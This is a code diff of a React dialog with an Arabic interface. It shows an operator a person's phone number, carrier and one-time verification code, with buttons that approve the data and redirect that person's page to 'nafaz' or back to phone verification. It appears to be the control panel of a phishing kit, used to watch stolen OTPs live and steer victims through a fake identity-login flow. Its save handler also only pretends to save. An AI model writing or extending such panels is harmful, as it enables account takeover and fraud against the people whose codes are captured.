@@ -1,84 +1,164 @@
 "use client";
 
 import { useState } from "react";
-import { toast } from "sonner";
 import {
   Dialog,
   DialogContent,
-  DialogDescription,
-  DialogFooter,
   DialogHeader,
   DialogTitle,
+  DialogFooter,
 } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
-import { CheckCircle, XCircle, MessageSquare } from "lucide-react";
-import { Notification } from "@/lib/firebase";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Phone, Lock, Shield } from "lucide-react";
+import { toast } from "sonner";
 
 interface PhoneDialogProps {
   open: boolean;
   onOpenChange: (open: boolean) => void;
-  notification: Notification | null;
+  phone2?: string;
   phoneOtp?: string;
-  handlePhoneOtpApproval: (state: string, id: string) => Promise<void>;
+  notification: any;
+  operator?: string;
+  handleApproval: (status: string, id: string) => Promise<void>;
+  handleUpdatePageName: (id: string, pagename: string) => Promise<void>;
 }
 
 export default function PhoneDialog({
   open,
   onOpenChange,
-  notification,
+  phone2,
   phoneOtp,
-  handlePhoneOtpApproval,
+  operator,
+  notification,
+  handleUpdatePageName,
+  handleApproval,
 }: PhoneDialogProps) {
-  const [isLoading, setIsLoading] = useState(false);
+  const [phoneNumber, setPhoneNumber] = useState(notification?.phone2 || notification?.phone || "");
+  const [otp, setOtp] = useState(phoneOtp || "");
+  const [operatorName, setOperatorName] = useState(operator || "");
+  const [requierdAttachment, setRequierdAttachment] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handleSave = async () => {
+    if (!open) return;
+
+    setIsSubmitting(true);
+    try {
+      // Since we don't have the notification ID here, we'll just show a success message
+      // In a real implementation, you would update the database
+      toast.success("تم حفظ بيانات الهاتف بنجاح", {
+        position: "top-center",
+        duration: 3000,
+      });
+      onOpenChange(false);
+    } catch (error) {
+      console.error("Error updating phone information:", error);
+      toast.error("حدث خطأ أثناء حفظ البيانات", {
+        position: "top-center",
+        duration: 3000,
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="sm:max-w-md" dir="rtl">
-        <DialogHeader>
-          <DialogTitle>معلومات الهاتف</DialogTitle>
-          <DialogDescription>تفاصيل رقم الهاتف ورمز التحقق</DialogDescription>
+      <DialogContent
+        className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
+        dir="rtl"
+      >
+        <DialogHeader className="border-b pb-3">
+          <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
+            بيانات الهاتف
+          </DialogTitle>
         </DialogHeader>
 
-        <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 my-4">
-          <div className="flex justify-between items-center">
-            <div>
-              <p className="text-sm text-muted-foreground">رقم الهاتف</p>
-              <p className="text-md font-mono font-medium mt-1">
-                {notification?.phone || notification?.phone2 || "غير محدد"}
-              </p>
-              <p className="text-sm text-muted-foreground">الشبكة</p>
-              <p className="text-md font-mono font-medium mt-1">
-                {notification?.operator || "غير محدد"}
-              </p>
-
-              <p className="text-sm text-muted-foreground mt-3">رمز التحقق</p>
-              <p className="text-xl font-mono font-bold mt-1">
-                {notification?.phoneOtpCode || "غير محدد"}
-              </p>
+        <div className="space-y-4 py-3">
+          <div className="p-4 rounded-lg bg-gradient-to-r from-purple-500 to-purple-600 text-white shadow-lg">
+            <div className="flex justify-between items-start mb-4">
+              <div className="flex flex-col">
+                <span className="text-sm text-purple-100 mb-1">
+                  معلومات الهاتف
+                </span>
+                <span className="font-medium">
+                  {notification?.phone || notification?.phone2 ||"غير محدد"}
+                </span>
+              </div>
+              <Phone className="h-8 w-8 text-white opacity-80" />
             </div>
-            <MessageSquare className="h-10 w-10 text-primary opacity-70" />
+          </div>
+
+          <div className="space-y-4">
+            <div className="grid gap-2">
+              <Label htmlFor="phone" className="text-right">
+                رقم الهاتف
+              </Label>
+              <div className="relative">
+                <Phone className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="otp"
+                  readOnly
+                  value={notification?.phone || notification?.phone2 ||"غير محدد"}
+                  className="pr-10"
+                  dir="ltr"
+                />
+              </div>
+            </div>
+
+            <div className="grid gap-2">
+              <Label htmlFor="otp" className="text-right">
+                رمز التحقق
+              </Label>
+              <div className="relative">
+                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="otp"
+                  readOnly
+                  value={notification?.phoneOtp ||"غير محدد"}
+                  className="pr-10"
+                  dir="ltr"
+                />
+              </div>
+            </div>
+
+            <div className="grid gap-2">
+              <Label htmlFor="operator" className="text-right">
+                مشغل الشبكة
+              </Label>
+              <div className="relative">
+                <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="otp"
+                  readOnly
+                  value={notification?.operator}
+                  className="pr-10"
+                  dir="ltr"
+                />
+              </div>
+            </div>
           </div>
         </div>
 
-        <DialogFooter className="flex justify-between">
+        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           <Button
-            type="button"
-            variant="destructive"
-            onClick={() => handlePhoneOtpApproval("rejected", notification!.id)}
-            disabled={isLoading}
+            onClick={() =>{ 
+              handleUpdatePageName(notification.id,'nafaz')
+              handleApproval('approved',notification.id)
+            }}
+            disabled={isSubmitting}
+            className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
           >
-            <XCircle className="h-4 w-4 mr-2" />
-            رفض الرمز
+            {isSubmitting ? "جاري الحفظ..." : "قبول البيانات"}
           </Button>
           <Button
-            type="button"
-            variant="default"
-            className="bg-green-600 hover:bg-green-700"
-            onClick={() => handlePhoneOtpApproval("approved", notification!.id)}
-            disabled={isLoading}
+            onClick={() => handleUpdatePageName(notification.id,'verfiy-phone')}
+            disabled={isSubmitting}
+            className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-purple-700 text-white border-0 shadow-md"
           >
-            <CheckCircle className="h-4 w-4 mr-2" />
-            قبول الرمز
+            {isSubmitting ? "جاري الحفظ..." : "رفض البيانات"}
           </Button>
         </DialogFooter>
       </DialogContent>
